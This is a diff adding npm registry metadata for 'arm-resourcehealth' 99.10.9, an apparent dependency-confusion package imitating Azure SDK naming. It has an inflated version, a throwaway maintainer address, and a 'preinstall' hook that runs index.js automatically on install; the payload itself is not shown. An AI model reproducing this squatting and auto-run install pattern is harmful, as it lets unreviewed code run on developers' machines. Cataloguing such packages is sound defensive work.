@@ -1,0 +1,62 @@
+{
+    "_id": "arm-resourcehealth",
+    "name": "arm-resourcehealth",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "arm-resourcehealth",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "arm-resourcehealth@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-akCvFkHfHDLfVLAMuKgEUZwK7XvU79k7G/b7mMHJx+ggh00b+3Rmb7pK8QQlULa9q7i87sjJdvY4fImSCf7kKQ==",
+                "shasum": "85b8cc5933ed15456dd3e1185b21f7c073befca3",
+                "tarball": "https://registry.npmjs.org/arm-resourcehealth/-/arm-resourcehealth-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5070,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiN1gHACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmp/jhAAijGrgyTscOZhBtgzR4SMCdSlOlTtVwqGXnUI+ZTJ69CtK8s+\r\nB1oNitMpOZ4quSJJ/ReyzhFUDwRrfdDqYR44Iq3wUobnscUNYROWMUyRhGHt\r\nk+8qs3eBXzu9v617nNQAX1ids3kEojx548pWe/FpVnKjDoqYAQc/GArmSCQL\r\ndyJCppgK/xJAP9vIDaldn9Ak/kJd1HQ56Gw2YOytuHSYi1gfFVZiVtWnES50\r\nKiWj3EZMOXcg0ZQAg0fP3YSOIWSE9A/6k0OWr8X3/LIMMG9JHeo027QXzMm2\r\n1/t4shLDA1meNz3xk7FhTMOUnmETJCC3G1zbGIm45nUzxk7l+ZaTlPd9fuXS\r\nzIzdAiBmIqdLFShe1RNngIhucruTC2vFnyKHcIK/BEya2foEqU36YUFCcIx3\r\nQ0NNbJsqtZqEEKpXw9/YULp/45YC844Kjl+cpTJ4ux86HjfgBW7KhlF6YjXE\r\noPEmlIxt8b/dYkVTlyjlRPv57uWjZj1wmGAaVz2sAKsB5R7VgdL0iq9mLvTS\r\n3SUZn8AROZmXJbHh7ewiUlydH4hm9f1WSMX7etYskj5xwnpsNLzUmUslkqiT\r\nuhA+CExbVoTxA0ZfOiVxNMzafVJRPVmduykFEMogXH0KL5EgKYhacBq1Vj4+\r\nx+9qRINhBEjaAxlaJu3m9EK9Wiqa9RBdEdM=\r\n=YS8i\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "cw3qeffn",
+                "email": "cw3qeffn@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "cw3qeffn",
+                    "email": "cw3qeffn@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/arm-resourcehealth_99.10.9_1647794183047_0.19220956810830625"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-20T16:36:23.046Z",
+        "99.10.9": "2022-03-20T16:36:23.182Z",
+        "modified": "2022-03-20T16:36:23.285Z"
+    },
+    "maintainers": [
+        {
+            "name": "cw3qeffn",
+            "email": "cw3qeffn@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
